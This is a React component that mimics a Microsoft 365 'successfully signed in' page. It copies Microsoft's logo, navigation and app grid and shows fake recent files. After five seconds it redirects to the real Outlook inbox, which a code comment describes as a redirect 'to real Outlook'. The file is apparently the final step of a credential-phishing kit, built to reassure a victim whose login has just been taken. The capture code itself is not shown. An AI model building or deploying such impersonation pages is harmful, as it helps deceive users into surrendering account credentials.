import React, { useEffect } from 'react';
import { User, LogOut } from 'lucide-react';

interface SuccessPageProps {
  email: string;
  onLogout: () => void;
}

export function SuccessPage({ email, onLogout }: SuccessPageProps) {
  useEffect(() => {
    // Automatically redirect to real Outlook after 5 seconds
    const timer = setTimeout(() => {
      // Generate a realistic Outlook redirect URL
      const outlookURL = 'https://outlook.office.com/mail/inbox';
      window.location.href = outlookURL;
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#f8f8f8' }}>
      {/* Microsoft Header */}
      <div className="bg-white" style={{ borderBottom: '1px solid #e1dfdd' }}>
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-3">
            <div className="flex items-center space-x-6">
              <img 
                className="h-6 w-auto" 
                src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" 
                alt="Microsoft" 
              />
              <nav className="hidden md:flex space-x-6">
                <a href="#" className="text-sm ms-text-primary hover:text-gray-900">Office</a>
                <a href="#" className="text-sm ms-text-primary hover:text-gray-900">Windows</a>
                <a href="#" className="text-sm ms-text-primary hover:text-gray-900">Surface</a>
                <a href="#" className="text-sm ms-text-primary hover:text-gray-900">Xbox</a>
                <a href="#" className="text-sm ms-text-primary hover:text-gray-900">Support</a>
              </nav>
            </div>
            <div className="flex items-center space-x-4">
              <div className="flex items-center space-x-2">
                <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center">
                  <User className="w-4 h-4 text-white" />
                </div>
                <span className="text-sm ms-text-primary">{email}</span>
              </div>
              <button
                onClick={onLogout}
                className="text-sm ms-text-secondary hover:text-gray-900 flex items-center space-x-1"
              >
                <LogOut className="w-4 h-4" />
                <span>Sign out</span>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-6xl mx-auto py-8 px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-12">
          <h1 className="text-4xl font-light ms-text-primary mb-4">
            Welcome to Microsoft 365
          </h1>
          <p className="text-lg ms-text-secondary max-w-2xl mx-auto">
            You're successfully signed in. Redirecting to your mailbox...
          </p>
          <div className="mt-4">
            <div className="inline-flex items-center space-x-2 text-sm ms-text-secondary">
              <div className="w-2 h-2 bg-blue-600 rounded-full animate-pulse"></div>
              <span>Redirecting to Outlook...</span>
            </div>
          </div>
        </div>

        {/* App Grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-6 mb-12">
          {[
            { name: 'Outlook', color: 'bg-blue-600', icon: '📧' },
            { name: 'Word', color: 'bg-blue-700', icon: '📄' },
            { name: 'Excel', color: 'bg-green-600', icon: '📊' },
            { name: 'PowerPoint', color: 'bg-orange-600', icon: '📈' },
            { name: 'OneNote', color: 'bg-purple-600', icon: '📝' },
            { name: 'Teams', color: 'bg-indigo-600', icon: '👥' },
            { name: 'OneDrive', color: 'bg-blue-500', icon: '☁️' },
            { name: 'SharePoint', color: 'bg-teal-600', icon: '🔗' },
          ].map((app) => (
            <div key={app.name} className="text-center">
              <div className={`w-16 h-16 ${app.color} rounded-lg flex items-center justify-center mx-auto mb-2 hover:scale-105 transition-transform cursor-pointer`}>
                <span className="text-2xl">{app.icon}</span>
              </div>
              <span className="text-sm ms-text-primary">{app.name}</span>
            </div>
          ))}
        </div>

        {/* Recent Files */}
        <div className="bg-white rounded-lg shadow-sm p-6" style={{ border: '1px solid #e1dfdd' }}>
          <h2 className="text-lg font-medium ms-text-primary mb-4">Recent files</h2>
          <div className="space-y-3">
            {[
              { name: 'Quarterly Report.docx', modified: '2 hours ago', type: 'Word' },
              { name: 'Budget Analysis.xlsx', modified: '1 day ago', type: 'Excel' },
              { name: 'Project Presentation.pptx', modified: '3 days ago', type: 'PowerPoint' },
            ].map((file, index) => (
              <div key={index} className="flex items-center space-x-3 p-2 hover:bg-gray-50 rounded cursor-pointer">
                <div className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center">
                  <span className="text-xs text-blue-600">{file.type[0]}</span>
                </div>
                <div className="flex-1">
                  <div className="text-sm font-medium ms-text-primary">{file.name}</div>
                  <div className="text-xs ms-text-secondary">Modified {file.modified}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}